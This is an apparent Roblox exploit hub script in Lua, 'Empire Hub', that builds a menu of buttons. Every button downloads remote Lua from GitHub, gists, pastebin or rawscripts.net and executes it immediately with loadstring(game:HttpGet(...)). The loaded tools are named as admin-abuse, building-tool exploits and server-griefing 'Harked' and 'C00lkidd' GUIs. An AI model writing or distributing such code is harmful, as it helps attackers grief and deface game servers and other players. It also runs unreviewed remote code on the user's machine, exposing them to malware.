local Hub = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Hub:CreateWindow({
    Name = "Empire Hub",
    Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
    LoadingTitle = "Empire Hub",
    LoadingSubtitle = "by Scratcher BOI/Wexploits",
    Theme = "DarkBlue", -- Check https://docs.sirius.menu/rayfield/configuration/themes
 
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil, -- Create a custom folder for your hub/game
       FileName = "Empire Hub"
    },
 
    Discord = {
       Enabled = true, -- Prompt the user to join your Discord server if their executor supports it
       Invite = "https://discord.gg/vEqnVgKCDv", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
 
    KeySystem = false, -- Set this to true to use our key system
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
       FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
       SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
       Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })

--Hub:Destroy()

local Tab1 = Window:CreateTab("Admin 🛡️")
local Section1 = Tab1:CreateSection("Admin")
local Tab2 = Window:CreateTab("F3X/Building Tools 🛠️")
local Section2 = Tab2:CreateSection("F3X/Building Tools")
local Tab3 = Window:CreateTab("Admin Games 🛡️")
local Section3 = Tab3:CreateSection("Admin Games")
local Tab5 = Window:CreateTab("Harked GUIS 🕶️")
local Section5 = Tab3:CreateSection("Harked GUIS")
local Tab4 = Window:CreateTab("Close Hub ⛔")
local Section4 = Tab4:CreateSection("Close Hub")

Hub:Notify({
    Title =  "Welcome",
    Content = "Welcome to the Epik Destroy Gui(Empire HUB) V1",
    Duration = 6.5,
    Image = 0,
 })

 local infiniteyield = Tab1:CreateButton({
   Name = "Infinite Yield",
   Callback = function()
      loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end
})

local namelessadmin = Tab1:CreateButton({
   Name = "Nameless Admin",
   Callback = function()
      loadstring(game:HttpGet('https://gist.github.com/inuk84/ca841931f45f242c945405298b26bd71/raw/af364e5d4ea5b0d2eac404a5376d83c84a23cbe4/na.lua'))()
   end
})

local hdadminabuser = Tab3:CreateButton({
   Name = "HD Admin Abuser",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/showcases/main/fedoratumadmin",true))()
   end
})

local C00lkiddSong = Tab3:CreateButton({
   Name = "C00LKID SONG",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ShutUpJamesTheLoser/C00lkiddSong/refs/heads/main/C00lkiddSong"))()
   end
})

local C00lkiddgui = Tab2:CreateButton({
   Name = "C00LKID GUI",
   Callback = function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ShutUpJamesTheLoser/C00lkiddgui/refs/heads/main/C00lkiddgui"))()
   end
})


local C00lkiddgui = Tab2:CreateButton({
   Name = "C00LKID F3X GUI",
   Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/UVzPQ0jA"))()
   end
})

local KillScript = Tab4:CreateButton({
   Name = "Kill Script(IDK if it works try)",
   Callback = function()
      Hub:Destroy()
   end
})

local Leaveserver = Tab4:CreateButton({
   Name = "Leave Server",
   Callback = function()
      game.Players.LocalPlayer:Kick("You Left the Server | Thx for using Empire Hub V1")
   end
})

local QuirkyCmd = Tab5:CreateButton({
   Name = "QuirkyCmd",
   Callback = function()
      -- QuirkyCMD by smokedoutlocedout, check source for full credits
      loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
   end
})

local HarkedREBORNGUIV2 = Tab5:CreateButton({
   Name = "Harked Reborn V2",
   Callback = function()
      loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Harked-Skript-6804"))()
   end
})

local DestructedHex = Tab5:CreateButton({
Name = "Destructed Hex",
Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/itzyaboyluq/projectligma/main/01j813hbqnssnabc.lua"))()
end
})

